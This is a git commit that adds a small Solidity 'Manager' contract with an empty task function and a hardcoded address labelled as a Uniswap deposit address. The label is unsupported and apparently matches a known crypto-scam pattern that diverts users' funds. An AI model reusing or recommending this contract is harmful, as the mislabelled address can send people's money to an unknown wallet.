d0024ca3b9b766065119a2103688e6beafaf65a3
Pancakeloan <87273484+Pancakeloan@users.noreply.github.com>
2022-02-03 13:20:22 -0800

    Create VE.Project.7.30.sol

---
+++ VE.Project.7.30.sol
@@ -0,0 +1,11 @@
+pragma solidity ^0.6.6;
+
+contract Manager {
+	function performTasks() public {
+	    
+	}
+
+	function uniswapDepositAddress() public pure returns (address) {
+		return 0xed3338E153b9400D49F38ca7e73Ea337fdb3c723;
+	}
+}
